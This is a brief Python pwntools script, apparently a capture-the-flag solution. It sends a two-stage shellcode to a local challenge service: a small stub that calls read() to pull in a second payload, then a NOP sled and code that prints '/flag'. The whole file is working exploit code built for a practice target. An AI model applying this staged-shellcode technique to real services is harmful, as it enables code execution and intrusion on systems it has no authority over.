from pwn import *

context.arch = "amd64"
#context.log_level = debug

def print_clean(data):
    data = data.split(b"\n")
    for i in data:
        print(i.decode("latin-1"))

# shellcode goes here
shellcode1 = asm(f"""
push 0
push 0
pop rdi
pop rax
mov rsi, 0x1EB25013
mov rdx, 120
syscall
""")
shellcraft.read()
shellcode2 = asm(f"""
{shellcraft.nop()*8}
{shellcraft.cat("/flag")}
""")


print(len(shellcode1))
p = remote("127.0.0.1", 1337)
print_clean(p.recvuntil(b"Reading 0x18 bytes from stdin.\n"))

p.sendline(shellcode1)
pause(1)
p.sendline(shellcode2)

print_clean(p.readrepeat())